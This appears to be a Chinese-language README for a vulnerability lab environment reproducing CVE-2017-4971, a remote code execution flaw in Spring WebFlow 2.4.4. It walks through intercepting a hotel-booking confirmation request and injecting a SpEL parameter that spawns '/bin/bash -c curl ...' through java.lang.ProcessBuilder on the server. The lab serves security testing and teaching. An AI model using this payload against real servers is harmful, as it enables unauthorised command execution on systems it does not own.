# Spring WebFlow 远程代码执行漏洞环境 (漏洞编号:CVE-2017-4971)
### 测试环境

本环境用spring-webflow源码的booking-mvc项目演示了Spring WebFlow框架中存在的一个代码执行的漏洞.

spring-webflow版本: 2.4.4

### 远程代码执行利用
浏览器[打开服务](http://{{ip}}:{{port[0]}}),预订酒店,到下面页面

> ![](vuln/spring/2.png)

点击Confirm同时修改此时的HTTP包

> ![](vuln/spring/1.png)

加入的参数

> `_(new+java.lang.ProcessBuilder((new+java.lang.String[]{"/bin/bash","-c","curl+baidu.com+>+/tmp/baidu"}))).start()=1`

发送请求后,会在目标机器执行`curl baidu.com > /tmp/baidu`

> 登陆在线控制台查看命令是否执行成功


### 参考资料
[Spring WebFlow 远程代码执行漏洞分析(CVE-2017-4971)](https://threathunter.org/topic/593d562353ab369c55425a90)